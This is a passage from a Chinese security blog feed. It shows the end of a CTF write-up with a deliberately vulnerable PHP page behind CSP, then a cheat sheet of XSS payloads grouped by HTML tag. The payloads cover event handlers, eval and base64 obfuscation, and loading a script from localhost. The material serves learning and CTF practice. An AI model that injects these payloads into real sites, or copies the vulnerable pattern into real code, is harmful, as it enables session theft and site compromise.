class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$this_host = $_SERVER[<span class="string">'HTTP_HOST'</span>];</span><br><span class="line">setcookie(<span class="string">'flag'</span>, <span class="string">'xxctf&#123;Mi1k7ea&#125;'</span>);</span><br><span class="line">$nonce = md5(openssl_random_pseudo_bytes(<span class="number">16</span>));</span><br><span class="line">header(<span class="string">"Content-Security-Policy: default-src 'none'; script-src 'nonce-$nonce' 'strict-dynamic'; base-uri 'self'; style-src 'self'; font-src 'self'"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"/static/jquery-3.3.1.js"</span> nonce=<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $nonce;<span class="meta">?&gt;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> nonce=<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $nonce;<span class="meta">?&gt;</span>&gt;</span><br><span class="line">$(document).ready(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">$(<span class="string">"#forminput"</span>).append(i);</span><br><span class="line"><span class="keyword">if</span> (location.search.indexOf(<span class="string">"name="</span>) != <span class="number">-1</span>) &#123;</span><br><span class="line">$(<span class="string">"#yourname"</span>).text(params[<span class="string">"name"</span>])</span><br><span class="line">&#125;;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">"csp.php"</span> method=<span class="string">"get"</span>&gt;</span><br><span class="line">&lt;div id=<span class="string">"forminput"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"name"</span> value=<span class="string">"Mi1k7ea"</span> hidden=<span class="string">"true"</span>&gt;</span><br><span class="line">&lt;button type=<span class="string">"submit"</span>&gt;Go&lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;h3&gt;Hi, &lt;a id=<span class="string">"yourname"</span>&gt;&lt;/a&gt; :)&lt;/h3&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>])) &#123;</span><br><span class="line">$x = @$_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span> (filter_var($x, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">$r = parse_url($x);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($r[<span class="string">'port'</span>])) &#123;</span><br><span class="line">$r[<span class="string">'host'</span>] = $r[<span class="string">'host'</span>].<span class="string">":"</span>.$r[<span class="string">'port'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/&#123;$this_host&#125;$/i"</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">$a = file_get_contents($x);</span><br><span class="line"><span class="keyword">echo</span> (<span class="string">"Result: &lt;pre&gt;"</span>.$a.<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script nonce=&#123;$nonce&#125;&gt;alert('You can only input &#123;$this_host&#125;')&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Invaild URL!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> nonce=<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $nonce;<span class="meta">?&gt;</span>&gt;</span><br><span class="line">url_param = <span class="keyword">new</span> URL(location.href).searchParams</span><br><span class="line">params = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span>(value of url_param.keys())&#123;</span><br><span class="line">params[value] = url_param.get(value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> i = document.createElement(<span class="string">"input"</span>);</span><br><span class="line">i.name = <span class="string">"url"</span>;</span><br><span class="line">i.type = <span class="string">"text"</span>;</span><br><span class="line"><span class="keyword">if</span> (location.search.indexOf(<span class="string">"post="</span>) != <span class="number">-1</span>) &#123;</span><br><span class="line">i.value = params[<span class="string">"post"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">i.placeholder = <span class="string">"input url..."</span>;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;之前CTF做的一道需要绕过CSP的XSS题目，具体的代码没记下来，这里写个类似的来复现。&lt;/p&gt;
&lt;h2 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;headerlink&quot; title=&quot;题目分析&quot;&gt;&lt;/a&gt;题目分析&lt;/h2&gt;&lt;p&gt;这里由于是本地写的类
      
    
    </summary>
    
      <category term="WriteUp:Web" scheme="https://Mi1k7ea.github.com/categories/WriteUp-Web/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="https://Mi1k7ea.github.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>一些加载XSS Payload的标签</title>
    <link href="https://Mi1k7ea.github.com/2019/02/19/%E4%B8%80%E4%BA%9B%E5%8A%A0%E8%BD%BDXSS-Payload%E7%9A%84%E6%A0%87%E7%AD%BE/"/>
    <id>https://Mi1k7ea.github.com/2019/02/19/一些加载XSS-Payload的标签/</id>
    <published>2019-02-19T14:54:12.000Z</published>
    <updated>2019-02-21T13:55:47.855Z</updated>
    
    <content type="html"><![CDATA[<p>之前整理的一些可以加载XSS Payload的标签，后面还会继续更新。</p><h2 id="script标签"><a href="#script标签" class="headerlink" title="script标签"></a>script标签</h2><p>这个标签不用多说。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1/a.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">eval("\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029")</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">eval("\x61\x6c\x65\x72\x74\x28\x31\x29")</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">eval(String.fromCharCode(97,108,101,114,116,40,49,41))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">var x=eval;x(alert(1));</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">(1, 2, eval)(alert(1))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">eval.call(null, 'alert(1)')</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">Mi1k7ea();function Mi1k7ea()&#123;alert(1);&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="a标签"><a href="#a标签" class="headerlink" title="a标签"></a>a标签</h2><p>其实，利用到javascript伪协议的payload，可以不用添加引号。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>Mi1k7ea<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:confirm(1)</span>&gt;</span>Mi1k7ea<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span>&gt;</span>Mi1k7ea<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span>Mi1k7ea<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onmouseout</span>=<span class="string">alert(1)</span>&gt;</span>Mi1k7ea<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">//其他onmouse系列...</span><br></pre></td></tr></table></figure><h2 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h2><p>通常是触发onerror事件来执行js代码，当然也有其他事件可触发。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"pain.jpg"</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"pain.jpg"</span> <span class="attr">onmouseout</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">//其他onmouse系列...</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">s</span>=<span class="string">createElement(</span>'<span class="attr">script</span>');<span class="attr">body.appendChild</span>(<span class="attr">s</span>);<span class="attr">s.src</span>=<span class="string">'http://127.0.0.1/a.js'</span>;&gt;</span>//alert被过滤</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">document.body.appendChild(document.createElement(</span>"<span class="attr">scr</span>"+"<span class="attr">ipt</span>"))<span class="attr">.src</span>=<span class="string">"http://127.0.0.1/a.js"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(</span>"\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x31</span>\<span class="attr">x29</span>")&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(</span>"&amp;#<span class="attr">97</span>;&amp;#<span class="attr">108</span>;&amp;#<span class="attr">101</span>;&amp;#<span class="attr">114</span>;&amp;#<span class="attr">116</span>;&amp;#<span class="attr">40</span>;&amp;#<span class="attr">49</span>;&amp;#<span class="attr">41</span>;")&gt;</span></span><br></pre></td></tr></table></figure><h2 id="body标签"><a href="#body标签" class="headerlink" title="body标签"></a>body标签</h2><p>主要可利用onload、onpageshow等事件属性</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onpageshow</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="svg标签"><a href="#svg标签" class="headerlink" title="svg标签"></a>svg标签</h2><p>svg标签可以和onload组合进行利用：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">document.body.appendChild(document.createElement(</span>"<span class="attr">scr</span>"+"<span class="attr">ipt</span>"))<span class="attr">.src</span>=<span class="string">"http://127.0.0.1/a.js"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">eval(String.fromCharCode(97,108,101,114,116,40,49,41))</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="form标签"><a href="#form标签" class="headerlink" title="form标签"></a>form标签</h2><p>form标签需要结合其中支持的标签和input标签才能成功触发。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//onmouse系列</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onmouseout</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//利用action</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="input标签"><a href="#input标签" class="headerlink" title="input标签"></a>input标签</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//支持onmouse系列</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onmouseout</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//改变输入框内容时触发</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">onchange</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//结合form标签使用formaction属性</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">formaction</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"image"</span> <span class="attr">formaction</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//通过Alt+Shift+自定义的字符（这里为M）触发，仅Firefox测试ok</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">accesskey</span>=<span class="string">"M"</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="style标签"><a href="#style标签" class="headerlink" title="style标签"></a>style标签</h2><p>style标签可以和onload组合进行利用：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">onload</span>=<span class="string">alert(1)</span> /&gt;</span><span class="undefined"></span></span><br></pre></td></tr></table></figure><h2 id="iframe标签"><a href="#iframe标签" class="headerlink" title="iframe标签"></a>iframe标签</h2><p>主要利用src属性来构造。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onmouseout</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">//其他onmouse系列...</span><br><span class="line">//base64加密内容为<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">"0px"</span> <span class="attr">height</span>=<span class="string">"0px"</span> <span class="attr">src</span>=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="</span> /&gt;</span></span><br><span class="line">//base64加密内容为<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1/a.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">"0px"</span> <span class="attr">height</span>=<span class="string">"0px"</span> <span class="attr">src</span>=<span class="string">"data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHA6Ly8xMjcuMC4wLjEvYS5qcyI+PC9zY3JpcHQ+"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript&amp;colon;alert&amp;lpar;1&amp;rpar;"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"</span> /&gt;</span>//谷歌可弹</span><br></pre></td></tr></table></figure><h2 id="object标签"><a href="#object标签" class="headerlink" title="object标签"></a>object标签</h2><p>利用data伪协议。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//base64加密内容为<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="</span> /&gt;</span></span><br><span class="line">//base64加密内容为<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1/a.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">"data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHA6Ly8xMjcuMC4wLjEvYS5qcyI+PC9zY3JpcHQ+"</span> /&gt;</span></span><br></pre></td></tr></table></figure><h2 id="span标签"><a href="#span标签" class="headerlink" title="span标签"></a>span标签</h2><p>通过Alt+Shift+自定义的字符（这里为M）触发，仅Firefox测试ok。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">accesskey</span>=<span class="string">"M"</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="marquee标签"><a href="#marquee标签" class="headerlink" title="marquee标签"></a>marquee标签</h2><p>Marquee 标签除了在web开发中有标签内容回滚作用之外，它还支持一系列的事件处理程序，因此可以用它来实现XSS Payload触发。Marquee支持的一系列事件处理程序如下：</p><p>onbounce事件：是在marquee标签中的内容滚动到上下或左右边界时触发的事件处理程序，该事件只有在marquee标签的behavior属性设为alternate时才有效；</p><p>onfinish事件：当 marquee 完成 loop 属性设置的值时触发。它只能在 loop 属性设置为大于 0 的某个数字时触发；</p><p>onstart事件: 当 marquee 标签内容开始滚动时触发。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">behavior</span>=<span class="string">"alternate"</span> <span class="attr">onstart</span>=<span class="string">alert(1)</span>&gt;</span>Mi1k7ea<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">loop</span>=<span class="string">"1"</span> <span class="attr">onfinish</span>=<span class="string">alert(1)</span>&gt;</span>Mi1k7ea<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onstart</span>=<span class="string">alert(1)</span>&gt;</span>Mi1k7ea<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Media类型标签"><a href="#Media类型标签" class="headerlink" title="Media类型标签"></a>Media类型标签</h2><p>Media类型标签的src属性加上javascript伪协议并不能触发XSS Payload。</p><p>audio标签和video标签的以下属性可用于触发payload。</p><p>oncanplay: 在用户可以开始播放音视频（audio/video）时触发；</p><p>ondurationchange: 在音视频（audio/video）的时长发生变化时触发；</p><p>onended: 在音视频（audio/video）播放结束时触发；</p><p>onloadeddata: 在音视频数据帧加载时触发，也即在当前帧的数据加载完成且还没有足够的数据播放音视频（audio/video）的下一帧时触发；</p><p>onloadedmetadata: 在指定音视频（audio/video）的元数据（如分辨率和时长）加载后触发；</p><p>onloadstart: 在浏览器开始寻找指定音视频（audio/video）时触发；</p><p>onprogress: 浏览器下载指定的音视频（audio/video）时触发；</p><p>onsuspend: 在浏览器读取音视频（audio/video）数据中止时触发。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">//audio标签，对应MP3文件</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">oncanplay</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">ondurationchange</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span>=<span class="string">"true"</span> <span class="attr">onended</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">onloadeddata</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">onloadedmetadata</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">onloadstart</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">onprogress</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">onsuspend</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">javascript:alert(1)</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">//video标签，对应MP4文件</span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">oncanplay</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">ondurationchange</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">autoplay</span>=<span class="string">"true"</span> <span class="attr">onended</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onloadeddata</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onloadedmetadata</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onloadstart</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onprogress</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onsuspend</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">javascript:alert(1)</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span> /&gt;</span></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" 